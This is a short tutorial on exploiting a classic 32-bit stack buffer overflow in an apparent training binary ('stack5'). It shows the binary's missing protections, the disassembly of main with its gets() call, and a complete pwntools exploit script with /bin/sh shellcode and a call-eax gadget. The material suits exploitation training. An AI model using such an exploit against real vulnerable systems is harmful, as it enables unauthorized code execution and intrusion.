# Simple Buffer Overflow


### 32bit Binary

If a binary has none of the following protections which simply means you can tweak with accordingly.

```bash
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE
```

To use the binary for your own advantage, either you create a shellcode which can be pushed onto stack and since the stack is executable(NX disabled) yi can use it call your shellcode. Shellcode can be found on shell-storm or even exploitdb.

##### Example

We have a binary, which takes a buffer and have the `main`:- 

```

Dump of assembler code for function main:
   0x080483c4 <+0>:	push   ebp
   0x080483c5 <+1>:	mov    ebp,esp
   0x080483c7 <+3>:	and    esp,0xfffffff0
   0x080483ca <+6>:	sub    esp,0x50
   0x080483cd <+9>:	lea    eax,[esp+0x10]
   0x080483d1 <+13>:	mov    DWORD PTR [esp],eax
   0x080483d4 <+16>:	call   0x80482e8 <gets@plt>
   0x080483d9 <+21>:	leave  
   0x080483da <+22>:	ret  

```

Checking for gadgets to jump on stack and execute the shellcode. Using ropper we found `0x080483bf: call eax;` which will call the eax and hence, the shellcode will be at eax ad calling it out will execute the shellcode.

Using, gdb we can get the buffer offset and create the following exploit:-

```python
from pwn import *

p = process("./stack5")

sh = '\x83\xc4\x10\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80'

payload =  sh + "A"*18 + p32(0x080483bf)
p.sendline(payload)
```